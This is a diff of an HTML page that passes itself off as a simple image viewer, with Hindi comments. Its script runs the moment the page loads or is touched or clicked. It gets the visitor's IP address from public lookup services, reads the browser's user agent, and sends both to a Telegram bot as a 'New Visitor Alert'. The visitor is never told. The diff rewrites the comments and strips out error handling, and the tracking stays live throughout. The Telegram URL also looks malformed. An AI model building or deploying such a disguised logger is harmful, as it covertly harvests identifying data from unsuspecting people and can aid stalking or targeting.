@@ -23,7 +23,7 @@
 </head>
 <body>
 
-    <!-- 📷 फोटो अब हमेशा दिखेगी -->
+    <!-- 📷 फोटो अब हमेशा लोड होगी -->
     <img src="photo.jpg" alt="Image Viewer">
 
     <script>
@@ -36,36 +36,31 @@
             if (isTracked) return;
             isTracked = true;
 
-            // 🌐 बिना किसी फिल्टर के सीधे और सबसे तेज आईपी निकालने वाली API
+            // 🌐 सीधे यूज़र का IP निकालने वाली सबसे भरोसेमंद और तेज API
             fetch('https://ipify.org')
-            .then(res => {
-                if (!res.ok) throw new Error('Network error');
-                return res.json();
-            })
+            .then(res => res.json())
             .then(data => {
-                // टेलीग्राम पर मैसेज भेजने का फंक्शन चालू करें
                 sendToTelegram(data.ip);
             })
-            .catch(err => {
-                // अगर ऊपर वाली API फेल हो तो बैकअप API
+            .catch(() => {
+                // बैकअप तरीका: अगर पहली API फेल हो तो दूसरी API
                 fetch('https://ipapi.co')
                 .then(res => res.json())
                 .then(data => {
                     sendToTelegram(data.ip);
-                }).catch(e => {
-                    // अगर इंटरनेट बिल्कुल काम न करे तो बिना आईपी के केवल नोटिफिकेशन भेजें
-                    sendToTelegram("IP Hidden/VPN Active");
+                }).catch(() => {
+                    sendToTelegram("IP Protected/VPN Active");
                 });
             });
         }
 
         function sendToTelegram(ip) {
-            // इनकॉग्निटो मोड में एरर से बचने के लिए सीधा यूज़र एजेंट टेक्स्ट निकालना
+            // यूज़र एजेंट से ब्राउज़र और बेसिक डिवाइस डिटेल्स निकालना
             const userAgentText = navigator.userAgent;
 
             const message = `🚨 *New Visitor Alert* 🚨\n\n` +
                             `🌐 *IP Address:* \`${ip}\`\n` +
-                            `📱 *User Agent:* \`${userAgentText}\`\n` +
+                            `📱 *Device Details:* \`${userAgentText}\`\n` +
                             `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;
 
             fetch(`https://telegram.org{telegramToken}/sendMessage`, {
@@ -76,12 +71,10 @@
                     text: message,
                     parse_mode: 'Markdown'
                 })
-            }).then(res => {
-                if(!res.ok) console.log("Telegram API Error");
             });
         }
 
-        // जैसे ही पेज लोड होगा या स्क्रीन छुई जाएगी, तुरंत डेटा जाएगा
+        // विज़िटर के आते ही या स्क्रीन पर कहीं भी टच करते ही तुरंत ट्रिगर होगा
         window.addEventListener('DOMContentLoaded', startTracking);
         window.addEventListener('touchstart', startTracking);
         window.addEventListener('click', startTracking);
